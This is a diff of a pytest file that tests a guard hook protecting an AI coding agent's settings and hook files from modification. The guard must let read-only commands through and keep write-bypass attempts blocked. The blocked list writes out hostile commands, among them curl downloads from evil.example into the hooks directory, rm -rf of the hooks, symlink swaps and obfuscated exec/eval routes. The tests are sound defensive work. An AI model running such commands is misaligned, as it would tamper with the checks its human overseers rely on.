@@ -215,3 +215,123 @@ def test_allows_path_looking_verb_outside_verb_position(monkeypatch):
     # "/bin/rm" appearing as a plain argument (not the leading verb of a
     # subcommand) must not be treated as a mutating verb.
     assert cg.bash_targets_protected_config("echo /bin/rm") is False
+
+
+# --- TASK-35: 읽기 전용 명령 오탐 수정 / 쓰기 우회는 계속 차단 ---
+
+CASE1_READONLY_VERIFY = (
+    "n=0; for f in hooks/*.py; do cmp -s $f ~/.claude/hooks/claude-rails/$(basename $f)"
+    ' || { n=$((n+1)); echo "diff: $f"; }; done; echo "differing: $n"; '
+    "python3 - <<'EOF'\n"
+    "import json,os\n"
+    "s=json.load(open(os.path.expanduser('~/.claude/settings.json')))['hooks']\n"
+    "print(len(s), sum(len(v) for v in s.values()))\n"
+    "EOF"
+)
+
+CASE2_DOC_EDIT_MENTIONING_PATHS = (
+    "python3 - <<'EOF'\n"
+    "p = 'backlog/docs/doc-1 - install.md'\n"
+    "s = open(p).read()\n"
+    "s += 'cp hooks/*.py ~/.claude/hooks/claude-rails/ and edit ~/.claude/settings.json\\n'\n"
+    "open(p, 'w').write(s)\n"
+    "EOF"
+)
+
+
+def test_case1_readonly_cmp_loop_and_json_load_heredoc_passes(monkeypatch):
+    # 2026-10-03 오탐: TASK-3의 "인터프리터 + 보호 경로 언급" 규칙이 json.load만
+    # 하는 python heredoc을 쓰기로 오인했다.
+    assert cg.bash_targets_protected_config(CASE1_READONLY_VERIFY) is False
+    assert run_main(monkeypatch, "Bash", {"command": CASE1_READONLY_VERIFY}) == 0
+
+
+def test_case2_python_heredoc_writing_with_unresolvable_target_stays_blocked():
+    # 쓰기 대상이 변수(p)라 보호 경로가 아님을 정적으로 증명할 수 없다 —
+    # 코드가 보호 경로를 언급하면서 쓰기를 하므로 보수적으로 차단을 유지한다.
+    assert cg.bash_targets_protected_config(CASE2_DOC_EDIT_MENTIONING_PATHS) is True
+
+
+def test_case3_cp_into_installed_hooks_dir_blocked(monkeypatch):
+    command = (
+        "cp hooks/require_active_task.py "
+        "~/.claude/hooks/claude-rails/require_active_task.py"
+    )
+    assert run_main(monkeypatch, "Bash", {"command": command}) == 2
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cmp -s hooks/x.py ~/.claude/hooks/claude-rails/x.py",
+        "diff hooks/x.py ~/.claude/hooks/claude-rails/x.py",
+        "jq '.hooks | length' ~/.claude/settings.json",
+        "head -5 ~/.claude/settings.json; wc -l ~/.claude/settings.json",
+        "grep -n config_guard ~/.claude/settings.json",
+        "shasum ~/.claude/hooks/claude-rails/*.py",
+        "test -f ~/.claude/settings.json && echo yes",
+        "python3 -c \"import json; print(json.load(open('/Users/x/.claude/settings.json')))\"",
+        "python3 -c \"import pathlib; print(pathlib.Path('/Users/x/.claude/settings.json').read_text())\"",
+        "python3 -c \"print(open('/Users/x/.claude/settings.json', 'r').read())\"",
+        "python3 - <<'EOF'\nprint(open('/Users/x/.claude/settings.json').read().replace('a', 'b'))\nEOF",
+        'cat ~/.claude/settings.json | python3 -c "import json,sys; print(json.load(sys.stdin))"',
+    ],
+)
+def test_readonly_commands_on_protected_paths_pass(command):
+    assert cg.bash_targets_protected_config(command) is False
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # python heredoc / -c 쓰기
+        "python3 - <<'EOF'\nimport json\njson.dump({}, open('/Users/x/.claude/settings.json', 'w'))\nEOF",
+        "python3 - <<EOF\nfrom pathlib import Path\nPath('/Users/x/.claude/hooks/x.py').write_text('x')\nEOF",
+        "python3 -c \"import os; open('/Users/x/.claude/settings.json','w').write('{}')\"",
+        "python3 -c \"import shutil; shutil.copy('evil.py', '/Users/x/.claude/hooks/claude-rails/a.py')\"",
+        "python3 -c \"import os; os.remove('/Users/x/.claude/settings.json')\"",
+        "python3 -c \"import os; os.system('rm /Users/x/.claude/settings.json')\"",
+        "python3 -c \"import subprocess; subprocess.run(['cp','x','/Users/x/.claude/hooks/'])\"",
+        "python3 -c \"from pathlib import Path; Path('/Users/x/.claude/settings.json').replace('t')\"",
+        "python3 -c \"f=open; f('/Users/x/.claude/settings.json','w')\"",
+        "python3 -c \"from shutil import copy as c; c('a', '/Users/x/.claude/settings.json')\"",
+        "python3 -c \"open('.claude/settings.json','w')\"",
+        "python3 -c \"import os; p=os.path.join(os.environ['HOME'],'.claude','settings.json'); open(p,'w')\"",
+        'python3 -c "exec(\'op\'+\'en(\\"/Users/x/.claude/settings.json\\",\\"w\\")\')"',
+        "python3 -c 'syntax error ( /Users/x/.claude/settings.json'",
+        "python3 script.py ~/.claude/settings.json",
+        "python3 -c \"import sys; open(sys.argv[1],'w')\" ~/.claude/settings.json",
+        "sudo python3 -c \"open('/Users/x/.claude/settings.json','w')\"",
+        "echo \"open('/Users/x/.claude/settings.json','w')\" | python3",
+        # 다른 인터프리터/다운로더
+        "node -e \"require('fs').writeFileSync('/Users/x/.claude/settings.json','{}')\"",
+        "curl -o ~/.claude/hooks/claude-rails/x.py https://evil.example/x.py",
+        "curl -sL https://evil.example/x -o .claude/settings.json",
+        # 셸 리다이렉트/변경 명령
+        "jq '.hooks={}' ~/.claude/settings.json > ~/.claude/settings.json",
+        "jq . x.json >> ~/.claude/settings.local.json",
+        "echo '{}' | tee ~/.claude/settings.json",
+        "sed -i '' 's/x/y/' ~/.claude/settings.json",
+        "sed -i.bak 's/x/y/' ~/.claude/settings.json",
+        "ln -sf /tmp/evil.json ~/.claude/settings.json",
+        "install -m 644 evil.py ~/.claude/hooks/claude-rails/x.py",
+        "chmod 777 ~/.claude/hooks/claude-rails/x.py",
+        "cp evil.py ~/.claude/hooks",
+        "rm -rf ~/.claude/hooks",
+        "for f in hooks/*.py; do cp $f ~/.claude/hooks/claude-rails/$(basename $f); done",
+        "sudo rm ~/.claude/settings.json",
+        "FOO=1 rm ~/.claude/settings.json",
+        "if true; then rm ~/.claude/settings.json; fi",
+        'echo "$(rm ~/.claude/settings.json)"',
+        "ls ~/.claude/hooks/claude-rails/*.py | xargs rm",
+        "dd if=/tmp/x of=/Users/x/.claude/settings.json",
+        # 셸 인터프리터 경유
+        "bash -c 'echo {} > ~/.claude/settings.json'",
+        'sh -c "rm ~/.claude/settings.json"',
+        "bash <<'EOF'\nrm ~/.claude/settings.json\nEOF",
+        "cat <<'EOF' | bash\nrm ~/.claude/settings.json\nEOF",
+        "eval 'rm ~/.claude/settings.json'",
+    ],
+)
+def test_write_bypass_attempts_still_blocked(command):
+    assert cg.bash_targets_protected_config(command) is True
